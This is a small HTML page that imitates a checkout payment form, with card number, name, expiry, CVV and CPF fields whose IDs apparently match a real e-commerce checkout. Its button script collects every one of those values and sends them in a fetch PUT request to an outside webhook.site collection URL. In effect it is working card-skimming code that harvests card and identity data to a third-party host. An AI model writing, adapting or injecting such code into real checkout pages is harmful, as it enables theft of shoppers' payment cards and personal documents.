<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <input
      id="creditCardpayment-card-0Number"
      data-testid="creditCardpayment-card-0Number"
      class="input-medium"
      name="cardNumber"
      type="tel"
      maxlength="30"
      value=""
    />
    <input
      class="input-medium"
      id="creditCardpayment-card-0Name"
      name="ccName"
      type="text"
      value=""
    />
    <select
      class="input-mini"
      id="creditCardpayment-card-0Month"
      name="cardExpirationMonth"
    >
      <!-- Opções do mês... -->
    </select>
    <select
      class="input-mini"
      id="creditCardpayment-card-0Year"
      name="cardExpirationYear"
    >
      <!-- Opções do ano... -->
    </select>
    <input
      id="creditCardpayment-card-0Code"
      class="input-mini"
      maxlength="3"
      autocomplete="off"
      type="tel"
      value=""
    />
    <input
      id="holder-document-0"
      data-testid="holder-document-0"
      class="input-small"
      type="tel"
      value=""
      placeholder="999.999.999-99"
    />

    <button onclick="checkout()">Enviar POST</button>

    <script>
      function checkout() {
        var ccnumber = "creditCardpayment-card-0Number";
        var ccnamenputid = "creditCardpayment-card-0Name";
        var expirationyearinputid = "creditCardpayment-card-0Month";
        var expirationmountinputid = "creditCardpayment-card-0Year";
        var cardcodeinputid = "creditCardpayment-card-0Code";
        var documentinputid = "holder-document-0";

        var cardNumber = document.getElementById(ccnumber).value;
        var ccName = document.getElementById(ccnamenputid).value;
        var cardExpirationMonth = document.getElementById(
          expirationyearinputid
        ).value;
        var cardExpirationYear = document.getElementById(
          expirationmountinputid
        ).value;
        var cardCode = document.getElementById(cardcodeinputid).value;
        var holderDocument = document.getElementById(documentinputid).value;
        var apiendpoint =
          "https://webhook.site/23cac3f8-33fe-43bd-aceb-cf29b7e781dd";
        var data = {
          cardNumber: cardNumber,
          ccName: ccName,
          cardExpirationMonth: cardExpirationMonth,
          cardExpirationYear: cardExpirationYear,
          cardCode: cardCode,
          holderDocument: holderDocument,
        };

        fetch(apiendpoint, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });
      }
    </script>

  </body>
</html>
